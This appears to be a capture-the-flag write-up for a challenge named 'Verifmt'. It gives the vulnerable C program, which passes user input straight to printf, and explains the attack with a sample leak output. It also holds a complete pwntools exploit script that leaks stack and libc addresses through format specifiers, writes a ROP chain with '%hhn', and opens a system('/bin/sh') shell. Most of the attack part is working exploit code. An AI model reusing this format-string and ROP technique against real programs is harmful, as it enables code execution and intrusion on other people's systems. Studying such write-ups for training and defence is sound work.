# Verifmt

Co-authors: @Tplus @Rosayxy

Attachment:

```c
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int verify_fmt(const char *fmt, size_t n_args) {
  size_t argcnt = 0;
  size_t len = strlen(fmt);

  for (size_t i = 0; i < len; i++) {
    if (fmt[i] == '%') {
      if (fmt[i+1] == '%') {
        i++;
        continue;
      }

      if (isdigit(fmt[i+1])) {
        puts("[-] Positional argument not supported");
        return 1;
      }

      if (argcnt >= n_args) {
        printf("[-] Cannot use more than %lu specifiers\n", n_args);
        return 1;
      }

      argcnt++;
    }
  }

  return 0;
}

int main() {
  size_t n_args;
  long args[4];
  char fmt[256];

  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  while (1) {
    /* Get arguments */
    printf("# of args: ");
    if (scanf("%lu", &n_args) != 1) {
      return 1;
    }

    if (n_args > 4) {
      puts("[-] Maximum of 4 arguments supported");
      continue;
    }

    memset(args, 0, sizeof(args));
    for (size_t i = 0; i < n_args; i++) {
      printf("args[%lu]: ", i);
      if (scanf("%ld", args + i) != 1) {
        return 1;
      }
    }

    /* Get format string */
    while (getchar() != '\n');
    printf("Format string: ");
    if (fgets(fmt, sizeof(fmt), stdin) == NULL) {
      return 1;
    }

    /* Verify format string */
    if (verify_fmt(fmt, n_args)) {
      continue;
    }

    /* Enjoy! */
    printf(fmt, args[0], args[1], args[2], args[3]);
  }

  return 0;
}
```

We can pass format string to the checker: it limits format string to four `%` and passes at most four arguments. However, we can eat more than one argument using `%*d`: the first argument is the width, the second argument is the actual value (suggested by @Tplus).

Therefore, we can dump eight parameters, leaking the stack address:

```shell
# of args: 4
args[0]: 10
args[1]: 10
args[2]: 10
args[3]: 10
Format string: %*d%*d%*d%p
        10        1000x7fffe81306d8
```

To leak libc address, we can use `%s` and pass the stack address via `args[i]` to read libc address on the stack. After that, we can use the typical `%n` to write data into stack and do ROP.

Attack script by @Rosayxy:

```python
from pwn import *
context(os='linux',log_level='debug')
p = process("./chall")
libc = ELF("./libc.so.6")
p.recvuntil("# of args: ")
p.sendline("4")

p.recvuntil("args[0]: ")
p.sendline("7")
p.recvuntil("args[1]: ")
p.sendline("7")
p.recvuntil("args[2]: ")
p.sendline("7")
p.recvuntil("args[3]: ")
p.sendline("7")
p.recvuntil("Format string: ")
p.sendline("%*d%*d%*d%p")

p.recvuntil("0x")
stack_leak = int(p.recvline().strip(),16)
log.success("stack_leak: " + hex(stack_leak))


ret_addr = stack_leak + 0x170
p.recvuntil("# of args: ")
p.sendline("1")
p.recvuntil("args[0]: ")
p.sendline(str(ret_addr))
p.recvuntil("Format string: ")
p.sendline("%s")
libc_leak = u64(p.recv(6).ljust(8,b"\x00"))
log.success("libc_leak: " + hex(libc_leak))

libc_base = libc_leak - 0x2a1ca
log.info("libc_base: " + hex(libc_base))

pop_rdi_ret = 0x0010f78b + libc_base
bin_shell = next(libc.search(b"/bin/sh")) + libc_base
system = libc.sym["system"] + libc_base

def arbwrite(val, addr):
    p.recvuntil("# of args: ")
    p.sendline("3")
    p.recvuntil("args[0]: ")
    if val == 0:
        val = 0x100
    p.sendline(str(val))
    p.recvuntil("args[1]: ")
    p.sendline("49")
    p.recvuntil("args[2]: ")
    p.sendline(str(addr))
    p.recvuntil("Format string: ")
    p.sendline("%*c%hhn")

ret = pop_rdi_ret + 1
payload = p64(pop_rdi_ret) + p64(bin_shell) + p64(ret) + p64(system)
for i in range(len(payload)):
    arbwrite(payload[i], ret_addr + i)


p.recvuntil("# of args: ")
p.sendline("%")
p.interactive()
```
